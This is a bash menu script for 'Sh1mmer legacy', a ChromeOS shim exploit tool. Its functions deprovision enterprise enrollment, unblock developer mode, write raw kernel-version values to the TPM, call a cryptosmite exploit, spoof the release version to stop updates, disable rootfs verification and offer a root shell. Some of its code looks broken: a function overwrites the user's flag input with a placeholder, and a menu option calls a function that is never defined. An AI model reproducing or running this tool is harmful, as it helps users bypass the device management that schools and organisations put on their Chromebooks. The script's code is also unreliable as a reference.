#!/bin/bash

set -eE

SCRIPT_DATE="[2024-05-22]"

COLOR_RESET="\033[0m"
COLOR_BLACK_B="\033[1;30m"
COLOR_RED_B="\033[1;31m"
COLOR_GREEN="\033[0;32m"
COLOR_GREEN_B="\033[1;32m"
COLOR_YELLOW="\033[0;33m"
COLOR_YELLOW_B="\033[1;33m"
COLOR_BLUE_B="\033[1;34m"
COLOR_MAGENTA_B="\033[1;35m"
COLOR_CYAN_B="\033[1;36m"

get_largest_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			largest="/dev/$dev_name"
			size="$tmp_size"
		fi
	done
	echo "$largest"
}

get_largest_cros_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			case "$(sfdisk -l -o name "/dev/$dev_name" 2>/dev/null)" in
				*STATE*KERN-A*ROOT-A*KERN-B*ROOT-B*)
					largest="/dev/$dev_name"
					size="$tmp_size"
					;;
			esac
		fi
	done
	echo "$largest"
}

format_part_number() {
	echo -n "$1"
	echo "$1" | grep -q '[0-9]$' && echo -n p
	echo "$2"
}

poll_key() {
	local held_key
	# dont need enable_input here
	# read will return nonzero when no key pressed
	# discard stdin
	read -r -s -n 10000 -t 0.1 held_key || :
	read -r -s -n 1 -t 0.1 held_key || :
	echo "$held_key"
}

deprovision() {
	echo "Deprovisioning..."
	vpd -i RW_VPD -s check_enrollment=0
	unblock_devmode
}

reprovision() {
	echo "Reprovisioning..."
	vpd -i RW_VPD -s check_enrollment=1
}

unblock_devmode() {
	echo "Unblocking devmode..."
	vpd -i RW_VPD -s block_devmode=0
	crossystem block_devmode=0
	local res
	res=$(cryptohome --action=get_firmware_management_parameters 2>&1)
	if [ $? -eq 0 ] && ! echo "$res" | grep -q "Unknown action"; then
		tpm_manager_client take_ownership
		cryptohome --action=remove_firmware_management_parameters
	fi
}

kvs(){
  echo "NOTICE: KVS is for UNENROLLED CHROMEBOOKS ONLY!"
sleep 3
echo "Please Enter Target kernver (0-3)"
      read -rep "> " kernver
      case $kernver in
        "0")
          echo "Setting kernver 0"
          initctl stop trunksd
          tpmc write 0x1008 02  4c 57 52 47  0 0 0 0  0 0 0  e8
          sleep 2
          echo "Finished writing kernver $kernver!"
          ;;
        "1")
          echo "Setting kernver 1"
          initctl stop trunksd
          tpmc write 0x1008 02  4c 57 52 47  1 0 1 0  0 0 0  55
          echo "Finished writing kernver $kernver!"
          ;;
        "2")
          echo "Setting kernver 2"
          initctl stop trunksd
          tpmc write 0x1008 02  4c 57 52 47  2 0 1 0  0 0 0  33
          echo "Finished writing kernver $kernver!"
          ;;
        "3")
          echo "Setting kernver 3"
          initctl stop trunksd
          tpmc write 0x1008 02  4c 57 52 47  3 0 1 0  0 0 0  EC
          echo "Finished writing kernver $kernver!"
          ;;
        *)
          echo "Invalid kernver. Please check your input." ;;
      esac
}

cryptosmite() {
  /usr/sbin/cryptosmite_sh1mmer.sh
}

stopupdates() {
cros_dev="$(get_largest_cros_blockdev)"
if [ -z "$cros_dev" ]; then
	echo "No CrOS SSD found on device!"
	exit 1
fi
echo "IMPORTANT!"
echo "THIS PAYLOAD WILL STOP YOUR CHROMEBOOK FROM UPDATING"
echo "IF YOU RECOVER YOUR CHROMEBOOK THESE CHANGES GO AWAY, MAKE SURE TO DO THIS AGAIN"
echo "Continue? (y/N)"
read -re action
case "$action" in
	[yY]) : ;;
	*) exit ;;
esac
local stateful=$(format_part_number "$cros_dev" 1)
local stateful_mnt=$(mktemp -d)
mount "$stateful" "$stateful_mnt"
mkdir -p "$stateful_mnt"/etc
printf "CHROMEOS_RELEASE_VERSION=9999.9999.9999.9999\nGOOGLE_RELEASE=9999.9999.9999.9999\n" >"$stateful_mnt"/etc/lsb-release
umount "$stateful_mnt"
rmdir "$stateful_mnt"
echo "Done."
}

mrchromebox(){
if [ -f mrchromebox.tar.gz ]; then
	echo "extracting mrchromebox.tar.gz"
	mkdir /tmp/mrchromebox
	tar -xf mrchromebox.tar.gz -C /tmp/mrchromebox
else
	echo "mrchromebox.tar.gz not found!" >&2
fi

clear
cd /tmp/mrchromebox
chmod +x firmware-util.sh
./firmware-util.sh || :

rm -rf /tmp/mrchromebox

}

enable_usb_boot() {
	echo "Enabling USB/altfw boot"
	crossystem dev_boot_usb=1
	crossystem dev_boot_legacy=1 || :
	crossystem dev_boot_altfw=1 || :
}

set_gbb_flags() {
  echo "What do you want your GBB flags to be set to?"
  echo "0x80b1 is recomended"
  read flags

if flashrom --wp-disable; then
    flags="some_flags_here"
    /usr/share/vboot/bin/set_gbb_flags.sh "$flags"
    echo "GBB flags set to $flags."
else
    echo "Could not disable software WP"
fi
}


touch_developer_mode() {
	local 
  cros_dev="$(get_largest_cros_blockdev)"
	if [ -z "$cros_dev" ]; then
		echo "No CrOS SSD found on device!"
		return 1
	fi
	echo "This will bypass the 5 minute developer mode delay on ${cros_dev}"
	echo "Continue? (y/N)"
	read -r action
	case "$action" in
		[yY]) : ;;
		*) return ;;
	esac
	local stateful=$(format_part_number "$cros_dev" 1)
	local stateful_mnt=$(mktemp -d)
	mount "$stateful" "$stateful_mnt"
	touch "$stateful_mnt/.developer_mode"
	umount "$stateful_mnt"
	rmdir "$stateful_mnt"
}

disable_verity() {
	local cros_dev="$(get_largest_cros_blockdev)"
	if [ -z "$cros_dev" ]; then
		echo "No CrOS SSD found on device!"
		return 1
	fi
	echo "READ THIS!!!!!! DON'T BE STUPID"
	echo "This script will disable rootfs verification. What does this mean? You'll be able to edit any file on the chromebook, useful for development, messing around, etc"
	echo "IF YOU DO THIS AND GO BACK INTO VERIFIED MODE (press the space key when it asks you to on the boot screen) YOUR CHROMEBOOK WILL STOP WORKING AND YOU WILL HAVE TO RECOVER"
	echo ""
	echo "This will disable rootfs verification on ${cros_dev} ..."
	sleep 4
	echo "Do you still want to do this? (y/N)"
	read -r action
	case "$action" in
		[yY]) : ;;
		*) return ;;
	esac
	/usr/share/vboot/bin/make_dev_ssd.sh -i "$cros_dev" --remove_rootfs_verification
}

factory() {
	clear
	/usr/sbin/factory_install.sh
}

tetris() {
	clear
	vitetris
}

splash() {
	printf "${COLOR_GREEN_B}"
	echo "ICBfX18gXyAgXyBfIF9fICBfXyBfXyAgX18gX19fIF9fXyAKIC8gX198IHx8IC8gfCAgXC8gIHwgIFwvICB8IF9ffCBfIFwKIFxfXyBcIF9fIHwgfCB8XC98IHwgfFwvfCB8IF98fCAgIC8KIHxfX18vX3x8X3xffF98ICB8X3xffCAgfF98X19ffF98X1wKCg==" | base64 -d
	printf "${COLOR_RESET}"
}

credits() {
	echo "CREDITS:"
	echo "@coolelectronics - Pioneering this wild exploit"
	echo "@ultrablue1850 - Testing & discovering how to disable shim rootfs verification"
	echo "@unciaur - Found the inital RMA shim"
	echo "@thememesniper - Testing"
	echo "@aliceindisarray - Hosting files"
	echo "@bypassi - Helped with the website"
	echo "@r58playz - Helped us set parts of the shim & made the initial GUI script"
	echo "@olyb - Scraped additional shims & last remaining sh1mmer maintainer"
	echo "@sh4rp.tech - Created wax & compiled the first shims"
	echo "@ember06666 - Helped with the website"
	echo "mark@mercurywork.shop - Technical Understanding and Advisory into the ChromeOS ecosystem"
}

run_task() {
	if "$@"; then
		echo "Done."
	else
		echo "TASK FAILED."
	fi
	echo "Press enter to return to the main menu."
	read -res
}

printf "\033[?25h"

while :; do
	clear
	splash
	echo "Welcome to Sh1mmer legacy."
	echo "Script date: ${SCRIPT_DATE}"
	echo "https://github.com/MercuryWorkshop/sh1mmer"
	echo ""
	echo "Select an option:"
	echo "(b) Bash shell"
	echo "(d) Deprovision device"
	echo "(r) Reprovision device"
	echo "(m) Unblock devmode"
	echo "(u) Enable USB/altfw boot"
	echo "(g) Edit GBB flags"
  	echo "(w) Disable software WP"
	echo "(h) Touch .developer_mode (skip 5 minute delay)"
	echo "(v) Remove rootfs verification"
  	echo "(k) KVS"
  	echo "(s) Cryptosmite <v119"
 	echo "(o) Stop updates"
 	echo "(p) MrChromebox's firmware utility script"
	echo "(t) Call chromeos-tpm-recovery"
	echo "(f) Continue to factory installer"
	echo "(i) Tetris"
	echo "(c) Credits"
	echo "(e) Exit and reboot"
	read -rep "> " choice
	case "$choice" in
	[bB]) run_task bash ;;
	[dD]) run_task deprovision ;;
	[rR]) run_task reprovision ;;
	[mM]) run_task unblock_devmode ;;
	[uU]) run_task enable_usb_boot ;;
	[gG]) run_task set_gbb_flags ;;
 	[wW]) run_task wp_disable ;;
	[hH]) run_task touch_developer_mode ;;
	[vV]) run_task disable_verity ;;
 	[kK]) run_task kvs ;;
	[sS]) run_task cryptosmite ;;
 	[oO]) run_task stopupdates ;;
	[pP]) run_task mrchromebox ;;
	[tT]) run_task chromeos-tpm-recovery ;;
	[fF]) run_task factory ;;
	[iI]) run_task tetris ;;
	[cC]) run_task credits ;;
	[eE]) break ;;
	*) echo "Invalid option" 
  sleep 2;;
	esac
	echo ""
done

printf "\033[?25l"
clear
splash
credits
echo ""
echo "Thank you for using Sh1mmer legacy."
echo ""
echo "Reboot in 5 seconds."
sleep 5
echo "Rebooting..."
reboot
tail -f /dev/null
